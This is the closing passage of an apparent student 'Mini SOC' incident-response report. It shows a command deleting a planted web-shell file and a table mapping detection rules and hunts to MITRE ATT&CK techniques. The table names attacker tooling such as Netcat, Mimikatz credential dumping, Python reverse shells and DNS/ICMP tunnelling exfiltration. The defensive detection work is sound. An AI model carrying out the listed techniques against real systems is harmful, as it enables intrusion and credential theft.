sudo rm -f /var/www/html/search.php
```
And that is the complete end-to-end incident response! Evidence captured, system sanitized.

## 6. MITRE ATT&CK Mapping Reference

| Rule / Hunt | Tool | MITRE Technique | Tactic |
|---|---|---|---|
| SSH Brute Force (Suricata Rule 1) | Suricata | T1110.001 – Password Guessing | Credential Access |
| Nmap SYN Scan (Suricata Rule 2) | Suricata | T1046 – Network Service Scanning | Discovery |
| SQL Injection (Suricata Rule 3) | Suricata | T1190 – Exploit Public-Facing App | Initial Access |
| Path Traversal (Suricata Rule 4) | Suricata | T1083 – File and Directory Discovery | Discovery |
| ICMP Tunnel (Suricata Rule 5) | Suricata | T1048.003 – Exfiltration (unencrypted) | Exfiltration |
| Suspicious DNS (Suricata Rule 6) | Suricata | T1071.004 – DNS Protocol Abuse | C2 |
| Netcat YARA Rule | YARA | T1059 – Command Interpreter | Execution |
| Mimikatz YARA Rule | YARA | T1003 – OS Credential Dumping | Credential Access |
| Python Rev Shell YARA | YARA | T1059.006 – Python | Execution |
| Base64 Obfuscation YARA | YARA | T1027 – Obfuscated Files | Defense Evasion |
| Off-hours Login Hunt | Python | T1078 – Valid Accounts | Persistence |
| Brute-then-Success Hunt | Python | T1110 → T1078 | Credential Access |
| SUDO Abuse Hunt | Bash | T1548.003 – Sudo Caching | Privilege Escalation |
| DNS Tunneling Hunt | Zeek | T1048.003 | Exfiltration |
| Non-Standard Ports Hunt | Zeek | T1571 – Non-Standard Port | C2 |
| Port Scan Fingerprint Hunt | Zeek | T1046 – Network Service Scanning | Discovery |
| New Account Hunt | Bash | T1136.001 – Local Account | Persistence |
| Cron Job Hunt | Bash | T1053.003 – Cron | Persistence |
| Unexpected Listeners Hunt | Bash | T1049 – System Network Connections | Discovery |
| SUID Binary Hunt | Bash | T1548.001 – Setuid | Privilege Escalation |
| Large Transfer Hunt | Zeek | T1041 – Exfiltration over C2 | Exfiltration |
| Web Shell Hunt | Bash | T1059.004 – Unix Shell | Execution |

---
*Mini SOC — Group Member Names | Murad Salaytah, Jameel Fakhoury, Nikita Mikhaylov, Mohammad Amr*.
